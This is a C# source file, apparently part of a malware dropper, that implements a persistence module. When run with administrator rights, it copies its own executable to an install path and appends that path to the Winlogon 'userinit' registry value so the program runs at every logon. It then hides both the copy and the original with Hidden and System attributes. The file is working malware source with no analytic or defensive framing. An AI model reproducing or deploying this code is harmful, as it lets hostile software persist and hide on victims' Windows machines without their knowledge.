using System.IO;
using Microsoft.Win32;
using System.Windows.Forms;

namespace Dropper.Classes
{
    public class Persistence
    {
        private static string userInit = @"C:\Windows\system32\userinit.exe,";
        private static bool IsInstalled()
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
            if ((string)rk.GetValue("userinit") == userInit)
                return false;
            return true;
        }
        public static bool IsRunningInstalled()
        {
            if (Application.ExecutablePath == Settings.Dropper.InstallPath)
                return true;
            return false;
        }
        public static void Install()
        {
            if (Extra.IsAdministrator())
            {
                if (!IsInstalled())
                {
                    File.Copy(Application.ExecutablePath, Settings.Dropper.InstallPath, true);

                    RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                    rk.SetValue("userinit", userInit + Settings.Dropper.InstallPath);

                    File.SetAttributes(Settings.Dropper.InstallPath, FileAttributes.Hidden | FileAttributes.System);
                    File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden | FileAttributes.System);
                }
            }
        }
    }
}